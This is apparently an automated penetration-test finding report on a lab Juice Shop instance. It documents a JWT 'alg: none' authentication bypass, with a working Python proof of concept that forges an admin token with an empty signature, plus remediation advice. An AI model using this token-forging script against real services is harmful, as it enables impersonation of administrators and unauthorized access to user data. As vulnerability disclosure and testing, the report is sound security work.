# JWT Algorithm=None Attack - Complete Authentication Bypass

**ID:** vuln-0002
**Severity:** CRITICAL
**Found:** 2026-09-04 14:54:23 UTC
**Target:** http://host.docker.internal:3100
**CWE:** CWE-347
**CVSS:** 9.8
**Confidence:** High
**Fix Effort:** Low

## Description

The application accepts JWT tokens with the `alg: none` algorithm in the Authorization header, allowing attackers to forge valid authentication tokens without any cryptographic key. This enables complete authentication bypass and privilege escalation to any role.

## Evidence

Test executed against http://host.docker.internal:3100/api/Users/1 with forged JWT token using alg=none. Server responded with HTTP 200 and returned the requested user data, confirming the token was accepted. The forged token used role=admin claim without any cryptographic key.

## Impact

An unauthenticated attacker can forge JWT tokens impersonating any user, including administrators. This allows unauthorized access to all protected resources, user data modification, and complete system compromise. No valid credentials are required—only the ability to send HTTP requests.

## Counterevidence

No input validation, no algorithm enforcement, and no signature verification observed on the authentication path. The none algorithm is explicitly accepted and processed. Testing with alg=none confirmed complete acceptance across multiple protected endpoints (/api/Users/1, /api/Complaints, /api/Feedbacks). No WAF, rate limiting, or additional verification gates were encountered.

## What Would Change This Severity

This finding would remain Critical even if the application were internal-only, as any user gaining access could completely bypass authentication. Confirmation that algorithm=none is enforced on every protected endpoint maintains Critical severity.

## Technical Analysis

The JWT verification logic does not enforce the algorithm type and accepts tokens with `"alg": "none"`. When a token uses this algorithm, the backend skips cryptographic signature verification. Attackers can craft JWT tokens with arbitrary claims (user ID, role, email) and an empty signature field, and these tokens are accepted as valid authentication credentials across all protected endpoints.

## Proof of Concept

1. Create a JWT token with header {"typ": "JWT", "alg": "none"} and any payload containing desired claims (e.g., role: admin, email: target@example.com, id: 1). 2. Encode header and payload in base64url format. 3. Set signature to empty string (token ends with dot). 4. Send the forged token in Authorization: Bearer header to any protected endpoint. 5. Server accepts the request and grants access based on forged claims.

```python
import requests
import json
import base64

BASE_URL = "http://host.docker.internal:3100"

# Craft malicious JWT payload
forged_payload = {
    "data": {
        "id": 1,
        "email": "admin@juice-sh.op",
        "role": "admin",
        "isActive": True
    },
    "bid": 1,
    "iat": 9999999999
}

forged_header = {"typ": "JWT", "alg": "none"}

# Encode header and payload
header_b64 = base64.urlsafe_b64encode(json.dumps(forged_header).encode()).decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(forged_payload).encode()).decode().rstrip('=')

# Create token with empty signature
forged_token = f"{header_b64}.{payload_b64}."

# Use forged token to access protected resource
headers = {"Authorization": f"Bearer {forged_token}"}
response = requests.get(f"{BASE_URL}/api/Users/1", headers=headers)

print(f"Status: {response.status_code}")
print(f"Response: {response.text[:500]}")
# Status 200 with user data confirms vulnerability
```

## Remediation

Implement strict JWT algorithm enforcement on the server. Configure the JWT verification library to only accept the expected algorithm (e.g., RS256) and reject any token with a different algorithm, particularly the "none" algorithm. Verify that all JWT libraries have algorithm pinning enabled. Additionally, implement additional checks to reject tokens before signature verification if the algorithm is not explicitly whitelisted.

## Assumptions

Assumes attacker can send HTTP requests to the target application. No special network access or credentials are required to exploit this vulnerability.
